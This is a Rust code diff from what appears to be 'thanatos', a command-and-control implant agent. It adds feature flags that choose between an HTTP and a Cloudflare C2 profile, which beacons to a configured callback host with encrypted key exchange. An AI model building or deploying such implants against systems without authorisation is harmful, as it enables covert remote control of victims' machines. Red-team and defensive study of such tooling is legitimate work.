@@ -5,14 +5,19 @@ use std::error::Error;
 use aes::Aes256;
 use block_modes::{block_padding::Pkcs7, BlockMode, Cbc};
 use hmac::{Hmac, Mac, NewMac};
-use http::{profilevars, HTTPProfile};
 use openssl::rsa;
 use serde::Deserialize;
 use serde_json::json;
 use sha2::Sha256;
 
-// Import the http profile
+#[cfg(not(any(feature = "http", feature = "cloudflare")))]
+compile_error!("thanatos requires the http or cloudflare C2 profile feature");
+#[cfg(feature = "cloudflare")]
+mod cloudflare;
+#[cfg(feature = "http")]
 mod http;
+#[cfg(feature = "http")]
+use http::{profilevars, HTTPProfile};
 
 /// Struct holding the response for a key exchange
 #[allow(dead_code)]
@@ -74,10 +79,16 @@ impl Profile {
     /// Generate a new C2 profile for the agent
     /// * `uuid` - Initial configured UUID
     pub fn new(uuid: String) -> Self {
+        #[cfg(all(feature = "cloudflare", not(feature = "http")))]
+        let profiles: Vec<Box<dyn C2Profile>> =
+            vec![Box::new(cloudflare::CloudflareProfile::new())];
+        #[cfg(feature = "http")]
+        let profiles: Vec<Box<dyn C2Profile>> =
+            vec![Box::new(HTTPProfile::new(&profilevars::cb_host()))];
         // Return a new `Profile` object
         Self {
             callback_uuid: uuid,
-            profiles: vec![Box::new(HTTPProfile::new(&profilevars::cb_host()))],
+            profiles,
             active: 0,
         }
     }
